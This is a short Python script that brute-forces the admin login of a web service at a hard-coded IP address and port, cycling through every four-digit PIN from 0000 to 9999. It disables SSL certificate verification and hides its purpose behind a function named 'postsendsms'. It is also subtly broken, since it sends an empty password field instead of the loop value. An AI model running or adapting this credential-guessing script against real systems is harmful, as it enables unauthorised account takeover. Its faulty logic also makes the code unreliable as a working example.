# -*- coding=utf-8 -*-
import urllib.request
import urllib.parse
import ssl
import json
import time

def postsendsms(password):
    ssl._create_default_https_context = ssl._create_unverified_context

    sendsmspost_url = 'http://219.153.49.228:43734'
    
    t = time.time()
    sendsmsheaders = {
        # 'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    }

    sendsmsform_data = {
        'username': 'admin',
        'password' : '',
        'submit' : 'Login',
    }

    # 构建post请求
    request = urllib.request.Request(url=sendsmspost_url, headers=sendsmsheaders)
    form_data = urllib.parse.urlencode(sendsmsform_data).encode()
    # 发送post请求
    response = urllib.request.urlopen(request, data=form_data)
    # dict_json = json.loads(response.read().decode())
    strdata = str(response.read().decode())
    if '后台登录' in strdata:
        print()
    else:
        print(strdata)
        quit()



if __name__ == '__main__':
    for num in range(0, 10000):
        if len(str(num)) < 4:
            for zero in range(4 - len(str(num))):
                num = '0' + str(num)
        print(num)
        postsendsms(num)
    
